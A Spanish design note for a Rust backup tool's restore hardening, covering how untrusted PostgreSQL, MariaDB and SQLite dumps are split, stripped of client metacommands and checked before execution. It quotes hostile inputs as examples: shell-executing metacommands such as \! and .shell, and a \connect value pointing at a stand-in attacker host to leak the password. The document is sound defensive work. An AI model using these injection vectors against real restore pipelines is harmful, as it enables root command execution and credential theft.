# FEATURE-041 — Endurecimiento de la restauración (#164)

- **Issue:** #164 (SEC-08), hijo de la auditoría de seguridad **#156** (bloque C de la campaña). **Change OpenSpec:** `endurecimiento-restauracion`. **Plan:** `plans/PLAN-041.md`.
- **Tipo:** producto (Rust + arnés/e2e + documentación). **No** toca el panel, ni el esquema, ni la forma del contrato HTTP de los targets, ni el formato de los volcados.
- **Dependencia de orden (bloqueante):** el bloque B (`confinamiento-frontera-motor`, PR **#174**) modifica **el mismo** requisito de la capability `restauracion`; este delta está redactado sobre el texto **post-B** y se apila sobre él. El archivado de este change va **después** de #174.

## Qué es

El volcado que la restauración entrega al cliente de la base sale de un repositorio S3 **que configura el operador**, con credenciales que el operador elige. Que la restauración exija un `snapshot_id` vinculado a una `job_execution` impide restaurar la instantánea de un repositorio ajeno, pero **no** impide que el repositorio propio esté comprometido o sustituido. Dentro de esa frontera el contenido es **no confiable** y se entrega al `stdin` de un intérprete que corre como `root` en el contenedor destino: sus metacomandos —`.shell` de `sqlite3`, `\!` de `mariadb` y `psql`— son **ejecución de órdenes** dentro de ese contenedor. Este bloque trata el volcado como hostil y lo cierra con **tres capas**, más un rechazo *fail-closed* del nombre de base que sale del propio volcado.

La frontera de confianza y el residual aceptado están declarados en `docs/ARQUITECTURA.md:20` («Frontera de confianza: el repositorio de copias») y en las viñetas de `AGENTS.md` sobre el volcado no confiable; **este documento no los repite**, los resume y apunta a ellos.

## Ficheros implicados

- `src/engine/troceador.rs` — **módulo nuevo**, puro (no habla con Docker, ni con la red, ni con la base, ni toca el disco). Es la máquina de estados léxica que decide, línea a línea, si cada una es **contenido** de la sección en curso, una **frontera** (`\connect <base>`) o un **metacomando** que se descarta (`Instruccion`, `src/engine/troceador.rs:79`). El contenido se devuelve **prestado** de la línea de entrada, lo que permite entregar el volcado sin copiarlo. Entra una línea y sale una `Instruccion`; por eso se prueba sin motor de contenedores.
- `src/engine/restauracion.rs` — `Reparto` (`:121`) con sus dos variantes; `comando()` (`:176`) añade `--binary-mode` a `mariadb` (`:210`), `-safe` a la reimportación de `sqlite` (`:312`) y el reparto por secciones a `postgresql` (plantilla `psql -X -U <usuario> -d` sin base, `:249`); `parece_cadena_de_conexion` (`:953`); `ejecutar_las_ordenes` (`:1020`) como despachador del reparto; `ejecutar_por_secciones` (`:1123`); `comprobar_que_el_cliente_soporta_restrict` (`:1229`) y `minimo_con_restrict` (`:1317`).
- `src/engine/mod.rs` — el puente `tunel_de_restauracion` y la llamada a `ejecutar_las_ordenes` con el `reparto` (import en `:92`, llamada en `:1289`). El volcado sigue yendo del repositorio al `stdin` por el puente acotado, **sin pasar por el disco**.
- `tests/e2e/escenarios.rs` — escenarios nuevos: `copia_y_restauracion_global_de_postgresql_reparte_cada_base_en_la_suya` (`:1439`), `un_psql_sin_restrict_falla_la_restauracion_sin_restaurar_nada` (`:1524`), `los_valores_que_parecen_un_metacomando_sobreviven_al_ciclo_en_postgresql` (`:1660`) y `…_en_mariadb` (`:1739`), con la guarda `exigir_psql_con_restrict` (`:561`).
- `tests/e2e/arnes.rs` — el contenedor `sqlite` del e2e trae `sqlite3 ≥ 3.27` (para `-safe`) y `readlink`; imágenes ya declaradas.
- `docs/ARQUITECTURA.md`, `docs/DEFINITION.md`, `AGENTS.md` — la frontera de confianza, el residual `COPY … FROM PROGRAM`, los requisitos de cliente y el límite de `ON_ERROR_STOP`.
- `openspec/changes/endurecimiento-restauracion/` · `plans/PLAN-041.md`.
- `ui/`: **sin cambios** (el contrato HTTP de los targets no cambia).

## Cómo funciona

### Capa 1 — El troceado y el descarte de metacomandos

El volcado de PostgreSQL **no** se entrega entero a un `psql`: se **trocea por base**. `pg_dumpall` separa las bases con metacomandos `\connect`, y el único modo de `psql` que rechaza metacomandos —`\restrict`— **bloquea `\connect`**: anteponerlo a un volcado global desvía los datos a la base equivocada (verificado: las filas de una base acaban en `postgres`). Trocear por base permite ignorar los metacomandos de cada sección sin perder el `\connect`.

El troceador es un **puerto fiel** del lexer de `psql` (`psqlscan.l`), no una heurística:

- **El estado léxico atraviesa las líneas.** Reconoce comilla simple (`''`), comilla doble (`""`), dólar (`$etiqueta$…$etiqueta$`), comentario de línea (`--`), comentario de bloque (`/* */`, **anidable**) y bloque `COPY … FROM stdin`. Un `\connect` dentro de un literal, de un cuerpo de función o de los datos de un `COPY` **no** es una frontera; un literal `E'…'` trata la barra invertida como escape, así que `\'` **no** cierra el literal (si no, un `\connect` posterior sería una **frontera falsa** y desviaría el resto de la sección a otra base).
- **El metacomando se reconoce por el primer byte no blanco**, no por la columna cero, y con el juego de blancos **completo** de `psql` (`[ \t\n\r\f\v]`): `\f\!`, `\v\!` y `\r\!` **ejecutan** en el cliente, así que un descarte que solo mirara espacio y tabulador los dejaría pasar como contenido.
- **El bloque `COPY … FROM stdin` se reconoce como lo reconoce `psql`**: registra la **letra inicial de los primeros identificadores de primer nivel** —tope ocho, sin los de paréntesis— y decide al ver el `;` a profundidad de paréntesis cero. No es una búsqueda de la subcadena `FROM stdin`, que daría falsos positivos (`COPY nope TO STDOUT; -- FROM stdin`) y falsos negativos (cabecera partida en dos líneas).
- **La frontera respeta los bordes del cliente**: el alias `\c` cuenta; la palabra ha de terminar ahí (`\connectx`, `\cd`, `\conninfo`, `\copy` **no** son fronteras); `\connect` **sin nombre** reconecta a la **misma** base y **no** abre sección; `""` dentro de un nombre entrecomillado es una comilla escapada, y la etiqueta de un dólar admite el juego **no ASCII** de `psql` (`$café$…$café$`).

En cada sección se **descartan** todas las líneas de metacomando de primer nivel, conservando el terminador `\.` de los bloques `COPY`. Es la guarda **principal**: sin metacomandos que entregar, no hay nada que ejecutar, y no depende de la versión del cliente. Se lleva también el `\unrestrict` de un volcado hostil, así que el atacante no puede deshacer la capa 2 con su propia línea de desbloqueo.

### Capa 2 — `\restrict <nonce>`, precondición obligatoria en tiempo de ejecución

A cada sección se le antepone `\restrict <nonce>`, con un `nonce` **aleatorio por restauración** (`rand`, no derivado del volcado). `\restrict` es la segunda capa: si el troceador dejara escapar un metacomando, `psql` lo rechazaría.

**No es opcional.** `\restrict` exige `psql` 17.6, o el mínimo de su rama (16.10, 15.14, 14.19, 13.22); PostgreSQL 18 lo trae de serie (`minimo_con_restrict`, `src/engine/restauracion.rs:1317`). Antes de leer una sola línea del volcado, `comprobar_que_el_cliente_soporta_restrict` (`src/engine/restauracion.rs:1229`) ejecuta `psql --version` con el **mismo binario** que usará el reparto —sin credencial, porque `--version` no conecta— y, si el cliente **no** honra `\restrict` —versión anterior al mínimo, salida ilegible o sonda que no llega a término—, la restauración **falla** nombrando el contenedor, la versión leída y el mínimo, y **no restaura nada**. El porqué de fallar en vez de degradarse: la capa 1 es código nuestro y su fallo no se ve venir; sin la capa 2, un metacomando que se le escape al troceador se ejecutaría como `root` en el contenedor destino. «La capa 1 sigue en pie» es una afirmación que solo se puede sostener con un cliente que honre `\restrict`.

### Capa 3 — El nombre de base del `\connect` no puede tener forma de cadena de conexión

La base de cada sección no la elige el operador: la escribe el `\connect` **del volcado**, que es contenido no confiable, y acaba como **valor** de `psql -d <base>` (nunca como argumento suelto: un nombre que empiece por `-` no puede leerse como opción). Pero `psql -d <valor>` lee el valor como *conninfo* —y de ahí saca `host`, `port`, `user`, `dbname`, `sslmode`…— si **contiene un `=`** o si **empieza** por la URI `postgres://` o `postgresql://`, los dos esquemas que reconoce libpq (verificado contra `psql` 18.6). Un volcado hostil con `\connect "host=atacante.example dbname=postgres"` llevaría la conexión al servidor del atacante **con `PGPASSWORD` puesto**: fuga de la credencial y restauración en el sitio equivocado.

`parece_cadena_de_conexion` (`src/engine/restauracion.rs:953`) lo **rechaza** —fail-closed— **antes** de componer la orden de la sección (`src/engine/restauracion.rs:1170`): la restauración **falla** sin ejecutar esa sección ni las siguientes, y el motivo nombra el contenedor y la forma del nombre, **nunca el valor** (contenido no confiable, con saltos de línea y escapes ANSI, que el panel muestra en `error_message`). La comparación del esquema es **sin distinguir mayúsculas**, así que el motor es un **superconjunto** de lo que libpq expande y rechaza también `POSTGRES://…`, que libpq trataría como nombre plano; rechazar de más es deliberado. La base de la **primera** sección —`db_name` o `postgres`— **no** se valida: la elige el operador en la configuración del target, no viene del volcado.

### El modelo de ejecución

`CaminoDeRestauracion::PorContenedor` gana un campo `reparto` (`Reparto`, `src/engine/restauracion.rs:121`):

- `Reparto::ALaUltimaOrden` — comportamiento de hoy: `mariadb` (una orden) y `sqlite` (retirar + reimportar, el volcado a la última).
- `Reparto::PorSeccionesDePostgres { plantilla, base_inicial }` — la `plantilla` es una `Orden` con `cmd` = `psql -X -U <usuario> -d` **sin** base y el entorno con `PGPASSWORD`; cada sección le añade su base como valor de `-d`. Se guarda como `Orden` a propósito: su `Debug` publica los **nombres** de las variables de entorno y nunca sus valores, así que la contraseña no se filtra en un `{:?}`.

Las bases no se conocen hasta leer el volcado, así que las órdenes de las secciones se construyen al vuelo desde la plantilla. `ejecutar_las_ordenes` (`src/engine/restauracion.rs:1020`) despacha según el `reparto`; en `PorSeccionesDePostgres` ejecuta la primera sección contra `base_inicial` (`db_name` o `postgres`) y una por cada frontera `\connect`. El volcado **no** se materializa: se lee línea a línea con un `BufReader` y cada sección se entrega al `stdin` de su `psql` conforme se identifica, con la memoria acotada al búfer del puente y a la línea en curso. Una sección que sale con código distinto de cero falla la restauración entera.

## Variables y configuración

**No hay ninguna variable de entorno nueva.** Lo que cambia es un **requisito del contenedor destino**, y es fail-closed:

| Pieza | Requisito | Comportamiento si falta |
|---|---|---|
| `sqlite3` del contenedor | Soporta `-safe` (SQLite ≥ 3.27) | La orden falla y el error del contenedor se registra, **no se silencia** |
| `psql` del contenedor (target `postgresql`) | Honra `\restrict`: 17.6, o el mínimo de su rama (16.10, 15.14, 14.19, 13.22); PostgreSQL 18 lo trae de serie | La restauración **falla** nombrando el contenedor, la versión y el mínimo, y **no restaura nada** |
| `mariadb` del contenedor | Soporta `--binary-mode` | La orden falla con el error del contenedor |

Con un cliente más viejo la restauración falla **en voz alta**, no en silencio. No hay que declarar nada para el despliegue de referencia: las imágenes de `postgres:18` y `mariadb:11` ya cumplen.

## Verificación de la entrega

- `just check-all` → verde.
- `just e2e` → **33 passed; 0 failed** (1337 s).
- `cargo test --locked -- --ignored` (los que necesitan `podman`) → **44 passed; 0 failed** (469 s).
- `openspec validate endurecimiento-restauracion --strict` → valid.
- Tres rondas de `@rust-reviewer`. El review dirigido del delta *conninfo* se contrastó contra `recognized_connection_string`/`uri_prefix_length` de libpq y salió sin bloqueantes.

## Decisiones

- **Tres clientes, tres mecanismos nativos.** Donde el cliente ya trae un modo, se usa el suyo (`-safe`, `--binary-mode`, `\restrict`); no se reimplementa en Kesto lo que el propio intérprete sabe ignorar.
- **La capa 1 es la guarda principal y la capa 2 es una red obligatoria.** Ignorar los metacomandos no depende de la versión del cliente; `\restrict` convierte un fallo de la primera en un rechazo del cliente. Descartada la variante de **degradarse en silencio** cuando el `psql` no honra `\restrict`: «la capa 1 sigue en pie» es algo que la batería verifica a mano, no una garantía de producción.
- **El troceador es un puerto, no una heurística.** Partir por `^\connect` rompería un volcado legítimo; los bordes (blancos, `E'…'`, alias `\c`, `\connect` sin nombre, dólar no ASCII, detección de `COPY` como `psql`) están verificados con `psql 18.6` y fijados con test. Es la razón de que sea un puerto: si PostgreSQL cambia su lexer, hay que revisarlo.
- **El reparto se guarda como `Orden`, no como lista de cadenas + entorno suelto.** El `Debug` de `Orden` publica los nombres de las variables y nunca sus valores, así que la plantilla hereda esa garantía y la contraseña no se filtra.
- **La base de la primera sección no se valida.** La elige el operador en el target, no viene del volcado; un test ancla la asimetría para que nadie la «arregle».
- **El rechazo del nombre con forma de conninfo es un superconjunto deliberado de libpq.** Se compara sin distinguir mayúsculas, así que `POSTGRES://…` se rechaza aunque libpq lo trataría como nombre plano. Fail-closed; el precio es un nombre de base exótico que falla en voz alta.
- **`COPY … FROM PROGRAM` es SQL, no un metacomando.** `\restrict` no lo corta y exige superusuario; no se corta recortando privilegios que la restauración necesita. Residual aceptado.

## Follow-ups y límites declarados

- **#175 — errores de SQL dentro de una sección.** `psql` sin `ON_ERROR_STOP` sale con `0` ante un error de SQL, así que una sección cuyas sentencias fallaron **se da por buena**. La garantía real —«se falla cuando una orden sale con un código distinto de cero»— está escrita en la doc de `ejecutar_por_secciones`; decidir la política (¿aborta la restauración entera ante la primera sentencia que falle?) va en #175.
- **#173 — `COPY … FROM PROGRAM`.** Residual aceptado; su sitio natural es la separación de privilegio del motor (la otra mitad de SEC-06).
- **Divergencias léxicas residuales.** Un `standard_conforming_strings=off`, un literal `U&'…'`, una etiqueta de dólar no ASCII fuera del juego del cliente, o una línea sin terminador son bordes que el troceador no cubre con total fidelidad; están documentados en `AGENTS.md` y `docs/ARQUITECTURA.md:20`.
- **Tope por línea del troceador.** La memoria está acotada a la línea en curso, pero una línea gigante sin `\n` la acumula entera. Residuo aceptado; su sitio es un tope por línea, no el módulo.
- **Mejora anotada y descartada:** volcado en formato custom (`pg_dump -Fc`) restaurado con `pg_restore`, inmune a metacomandos **por construcción**; cambiaría el formato almacenado y sale del alcance de la extracción.
- **#171 y el flake del e2e** (`502 Bad Gateway` de S3/SeaweedFS).
